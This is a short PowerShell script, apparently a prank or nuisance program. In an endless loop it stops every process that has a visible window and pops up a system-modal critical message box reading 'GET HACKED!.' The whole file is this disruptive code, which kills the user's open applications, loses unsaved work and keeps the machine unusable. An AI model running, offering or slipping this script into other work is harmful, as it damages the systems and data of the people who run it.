[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") 

while (1) {
Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
[Microsoft.VisualBasic.Interaction]::MsgBox("GET HACKED!.", "OKOnly,SystemModal,Critical", "eZZZZZ")
}
